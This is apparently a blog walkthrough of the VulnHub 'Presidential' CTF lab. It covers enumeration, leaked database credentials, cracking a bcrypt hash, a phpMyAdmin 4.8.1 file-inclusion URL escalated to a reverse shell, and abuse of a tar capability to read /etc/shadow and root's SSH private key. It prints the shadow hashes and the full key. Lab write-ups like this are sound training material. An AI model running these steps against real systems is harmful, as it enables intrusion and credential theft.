---
layout: single
title: Presidential - VulnHub
excerpt: "The Presidential Elections within the USA are just around the corner (November 2020). One of the political parties is concerned that the other political party is going to perform electoral fraud by hacking into the registration system, and falsifying the votes.

The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns. Your goal is to see if you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website and registration system are launched."

date: 2024-08-14
classes: wide
header:
  teaser: /assets/images/2024-08-14-vulnhub-Presidential/web_interface.png
  teaser_home_page: true
  icon: /assets/images/vulnhub-logo.png
categories:
  - vulnhub
  - infosec
tags: 
  - hashcat
  - phpmyadmin
  - ssh
  - mysql
  - capabilities
---

![](/assets/images/2024-08-14-vulnhub-Presidential/web_interface.png)

The Presidential Elections within the USA are just around the corner (November 2020). One of the political parties is concerned that the other political party is going to perform electoral fraud by hacking into the registration system, and falsifying the votes.

The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns. Your goal is to see if you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website and registration system are launched.

# Hack the Machine

## PortScan

```
# Nmap 7.94SVN scan initiated Wed Aug 14 15:55:11 2024 as: nmap -sCV -p80,2082 -oN target 192.168.1.20
Nmap scan report for 192.168.1.20
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
|_http-title: Ontario Election Services &raquo; Vote Now!
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)
MAC Address: 00:0C:29:3D:48:E9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 14 15:55:18 2024 -- 1 IP address (1 host up) scanned in 6.88 seconds
```


## WebSite

![](assets/images/2024-08-14-vulnhub-Presidential/web_interface.png)

At this point we start scanning the entire website extensively, applying fuzzing to find directories and subdomains.

![](/assets/images/2024-08-14-vulnhub-Presidential/email-votenow.png)

Scanning the web we see that there is an e-mail contact@votenow.local, at this point we are interested in adding this domain to our **/etc/hosts** to see if the web changes. => 192.168.1.20 votenow.local

## SubDomains Scanning

```
gobuster vhost -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt 20 --append-domain | grep -v "400"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://votenow.local/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: datasafe.votenow.local Status: 200 [Size: 9499]
Progress: 116441 / 141709 (82.17%)^C
```
And we found a important subdomain, at this point we need to edit **/etc/hosts** => 192.168.1.20 datasafe.votenow.local. This domain **phpmyadmin** is running.

## Directory Listing

```
gobuster dir -u http://192.168.1.20/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,php.bak,php.back,bak,back,txt,html,tar,gz -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.20/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php.bak,txt,php,bak,back,html,tar,gz,php.back
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/index.html           (Status: 200) [Size: 11713]
/about.html           (Status: 200) [Size: 20194]
/assets               (Status: 301) [Size: 235] [--> http://192.168.1.20/assets/]
/config.php.bak       (Status: 200) [Size: 107]
/config.php           (Status: 200) [Size: 0]
Progress: 26234 / 2205610 (1.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 33874 / 2205610 (1.54%)
```
After some time fuzzing we finally found something. Let's turn our attention to **config.php.bak** and find credentials:

```php
<?php

$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";

?>
```

At this point we try these credentials in **phpmyadmin**. And we are in:

![](/assets/images/2024-08-14-vulnhub-Presidential/phpmyadmin_interface.png))


## Scanning PhpMyAdmin

In **votebox** data base we can see **users** table and found **admin** user and his password but that password encrypted whit bcrypt. In this point we can crack the password whit John The Ripper:
```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
This process will take a while, but when it is finished you will find the password:

```
$2a$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i:Stella
```

After some time performing an exhaustive scan, we see that the phpmyadmin version is ^**4.8.1**. Using searchsploit we can find vulnerabilities:
```
searchsploit phpmyadmin 4.8.1
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                                                                           | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                                                                           | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                                                                                                        | php/webapps/50457.py
```

We will focus our attention on the **Remote Code Execution (RCE)**. In this case we will not use the exploit to automate everything but we will do manually:

We have to put our session cookie:
```
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_r3i75sdop9i2tgngpd2al9be1rs6mo36
```
Now we can see a lot of information in the phpmyadmin interface:

![](/assets/images/2024-08-14-vulnhub-Presidential/information_db.png)

What we have to do now is a test using the sql, in order to derive the LFI to a RCE:

![](/assets/images/2024-08-14-vulnhub-Presidential/query_test.png)

![](/assets/images/2024-08-14-vulnhub-Presidential/hello_test.png)

At this point as we are in a php resource if we now put malicious code php will interpret it:

![](/assets/images/2024-08-14-vulnhub-Presidential/revershell.png)

Before reloading the page, we must listen on port 443:

```
nc -nlvp 443
```

And at this point we have already gained access to the machine:

![](/assets/images/2024-08-14-vulnhub-Presidential/hacked.png)

# Privilege Escalation

## Tty tratament
The shell we have now is a bit limited, so we are going to perform a TTY (terminal type) treatment:

You have to put **reset xterm** in the screenshot you can not see it:

![](/assets/images/2024-08-14-vulnhub-Presidential/stty-tratament-1.png)

![](/assets/images/2024-08-14-vulnhub-Presidential/ajustando-tty-2.png)

at this point we are going to take advantage of the **admin** user credentials that we have obtained by cracking it:

```
bash-4.2$ su admin
Password: 
[admin@votenow phpmyadmin]$ 
```

## Scanning the inside of the machine

At this point we are already inside the machine. Then we have to perform an exhaustive scan of the machine's interior to find vulnerabilities and to be able to escalate our privilege. After some time scanning the machine, we found the following:

```
[admin@votenow phpmyadmin]$ getcap -r / 2> /dev/null 
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/tarS = cap_dac_read_search+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
[admin@votenow phpmyadmin]$ 
```

```
/usr/bin/tarS = cap_dac_read_search+ep
```

The **CAP_DAC_READ_SEARCH+ep** capability allows a process to ignore discretionary access restrictions when reading files and accessing directories. Knowing this what we can try is to make a compressed directory of /etc/shadow to test if it works:

```
[admin@votenow shm]$ tarS -cvf shadow.tar /etc/shadow
tarS: Removing leading `/' from member names
/etc/shadow
[admin@votenow shm]$ ls
shadow.tar
[admin@votenow shm]$ tar -xf shadow.tar 
[admin@votenow shm]$ cd etc/       
[admin@votenow etc]$ cat shadow 
cat: shadow: Permission denied
[admin@votenow etc]$ chmod 770 shadow 
[admin@votenow etc]$ cat shadow 
root:$6$BvtXLMHn$zoYCSCRbdnaUOb4u3su6of9DDUXeUEe05OOiPIQ5AWo6AB3FWRr/RC3PQ4z.ryqn6o5xS9g4JTKHYI4ek9y541:18440:0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
systemd-network:!!:18440::::::
dbus:!!:18440::::::
polkitd:!!:18440::::::
sshd:!!:18440::::::
postfix:!!:18440::::::
chrony:!!:18440::::::
apache:!!:18440::::::
admin:$6$QeT4IOER$tHg/DAvc5NegomFKFryL5Xe7Od05z7CkYYs9sdRQaQVnJYvsXm2tQljaUhgXVMG8jXaChhhmny6MhD2K5jFXF/:18440:0:99999:7:::
mysql:!!:18440::::::
[admin@votenow etc]$ 
```
And it worked! Now what we are going to do in order to gain access as user root, is the following:

```
[admin@votenow etc]$ tarS -cvf ssh.tar /root/.ssh/id_rsa
tarS: Removing leading `/' from member names
/root/.ssh/id_rsa
[admin@votenow etc]$ tarS -xf ssh.tar 
[admin@votenow etc]$ cd root/.ssh/
[admin@votenow .ssh]$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
[admin@votenow .ssh]$ 
```

```
[admin@votenow .ssh]$ ssh -i id_rsa root@localhost -p 2082
Last login: Wed Aug 14 17:39:34 2024 from 127.0.0.1
[root@votenow ~]# whoami
root
[root@votenow ~]# cat 
.bash_history        .config/             .ssh/
.bash_logout         .cshrc               .tcshrc
.bash_profile        .local/              .viminfo
.bashrc              .mysql_history       anaconda-ks.cfg
.cache/              .pki/                root-final-flag.txt
[root@votenow ~]# cat /root/
.bash_history        .config/             .ssh/
.bash_logout         .cshrc               .tcshrc
.bash_profile        .local/              .viminfo
.bashrc              .mysql_history       anaconda-ks.cfg
.cache/              .pki/                root-final-flag.txt
[root@votenow ~]# cat /root/root-final-flag.txt 
Congratulations on getting root.

 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

This CTF was created by bootlesshacker - https://security.caerdydd.wales

Please visit my blog and provide feedback - I will be glad to hear from you.
[root@votenow ~]# 
```

Finally we have finished compromising the machine.

Arc4he
